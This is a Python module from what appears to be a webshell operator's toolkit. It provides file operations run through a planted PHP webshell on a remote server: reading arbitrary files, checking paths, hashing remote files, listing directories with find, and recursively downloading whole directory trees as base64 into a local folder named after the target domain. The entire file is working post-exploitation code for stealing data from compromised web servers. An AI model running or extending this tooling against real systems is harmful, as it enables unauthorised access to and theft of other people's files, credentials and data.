"""File operations: read, existence checks and downloads (with skip-if-unchanged)."""

from __future__ import annotations

import base64
import shlex
from pathlib import Path

from .. import log
from ..core.php import php_string
from ..core.webshell import WebShell
from ..exceptions import WebshellError
from ..utils.hashing import hash_file
from ..utils.http import get_domain


def read_file(ws: WebShell, path: str) -> str:
    log.info(f"Reading file: {path}")
    content = ws.run_php(f"echo file_get_contents({php_string(path)})")
    log.raw(content)
    return content


def file_exists(ws: WebShell, path: str) -> bool:
    result = ws.run_php(f"var_dump(file_exists({php_string(path)}))")
    return "bool(true)" in result


def is_directory(ws: WebShell, path: str) -> bool:
    result = ws.run_php(f"var_dump(is_dir({php_string(path)}))")
    return "bool(true)" in result


def hash_remote_file(ws: WebShell, path: str) -> str:
    return ws.run_php(f"echo md5(file_get_contents({php_string(path)}))").strip()


def list_directories(ws: WebShell, path: str) -> list[str]:
    output = ws.run_command(f"find {shlex.quote(path)} -type d")
    return [line for line in output.splitlines() if line and not line.startswith("find:")]


def _local_path(ws: WebShell, remote_path: str, output_dir: Path) -> Path:
    """Mirror ``remote_path`` under ``output_dir/<domain>/``."""
    return output_dir / get_domain(ws.url) / remote_path.lstrip("/")


def _download_one(ws: WebShell, remote_path: str, local_path: Path) -> bool:
    """Download a single file, skipping it if an identical copy already exists."""
    if local_path.exists():
        if hash_remote_file(ws, remote_path) == hash_file(local_path):
            log.warning(f"Unchanged, skipping: {remote_path}")
            return True
        log.info(f"Remote changed, re-downloading: {remote_path}")
    encoded = ws.run_php(f"echo base64_encode(file_get_contents({php_string(remote_path)}))")
    try:
        data = base64.b64decode(encoded)
    except (ValueError, TypeError) as exc:
        log.error(f"Failed to decode {remote_path}: {exc}")
        return False
    local_path.parent.mkdir(parents=True, exist_ok=True)
    local_path.write_bytes(data)
    log.success(f"Saved {remote_path} -> {local_path} ({len(data)} bytes)")
    return True


def download(ws: WebShell, remote_path: str, output_dir: Path) -> None:
    """Download a single remote file."""
    _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir))


def download_tree(
    ws: WebShell, path: str, name_filter: str = "*", find_args: str | None = None,
    *, output_dir: Path,
) -> None:
    """Recursively download files under ``path``.

    ``name_filter`` maps to ``find -name``; pass ``find_args`` for full control
    (the v1 "download advanced" mode, e.g. ``-size -500k``).
    """
    if find_args:
        cmd = f"find {shlex.quote(path)} {find_args}"
    else:
        cmd = f"find {shlex.quote(path)} -type f -name {shlex.quote(name_filter)}"
    try:
        listing = ws.run_command(cmd)
    except WebshellError as exc:
        log.error(f"Listing failed: {exc}")
        return
    files = [line for line in listing.splitlines() if line and not line.startswith("find:")]
    log.info(f"{len(files)} file(s) to download.")
    for remote_path in files:
        _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir))
